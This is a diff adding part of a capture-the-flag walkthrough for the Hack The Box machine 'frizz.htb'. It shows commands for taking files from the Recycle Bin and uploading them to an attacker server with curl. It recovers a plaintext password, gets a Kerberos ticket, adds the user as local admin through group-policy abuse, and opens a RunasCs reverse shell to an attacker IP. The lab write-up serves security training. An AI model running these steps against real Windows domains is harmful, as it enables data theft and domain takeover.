@@ -264,3 +264,69 @@ This work for me
 ```
 
 Then we can get the shell as `f.frizzle`
+By enumerating the file system of this machine, we can find something interesting from the `Recycle Bin`
+```
+PS C:\$RECYCLE.BIN> Get-ChildItem -Recurse -Force
+
+    Directory: C:\$RECYCLE.BIN
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103
+
+    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
+-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
+-a-hs          10/29/2024  7:31 AM            129 desktop.ini
+
+```
+
+There is 2 zip file here, we need to download them into our machine.
+Because of I use the ssh shell, not the evil-winrm shell, so I need to upload the zip files into my local machine.
+```
+Copy-Item -Path "C:\`$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\`$IE2XMEG.7z" -Destination "C:\Users\f.frizzle"
+
+curl.exe -F "files=@C:\Users\f.frizzle\`$IE2XMEG.7z" http://10.10.16.3:8080/upload
+
+in the local machine
+python3 -m uploadserver 8080
+```
+
+Then  we can successfully get the password of `"M.SchoolBus" : '!suBcig@MehTed!R' `
+Let's continue to do what we have done for ssh before
+```
+sudo ntpdate 10.10.11.60
+
+getTGT.py frizz.htb/M.SchoolBus
+
+export KRB5CCNAME=M.SchoolBus.ccache
+
+ssh M.SchoolBus@10.10.11.60
+```
+
+Then we can get the shell as `M.SchoolBus`
+
+To get the root shell
+We need to use 2 tools for here
+`https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe`
+and 
+`https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip`
+```
+# get root
+New-GPO -Name "doesnotmatter"
+
+#add newlink to domain controllers
+New-GPLink -Name "doesnotmatter" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
+
+#add m.schoolbus to localadmin group
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName doesnotmatter
+
+#force group policy update
+gpupdate /force
+
+#send yourself a revshell with admin rights:
+.\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r IP:9001
+```
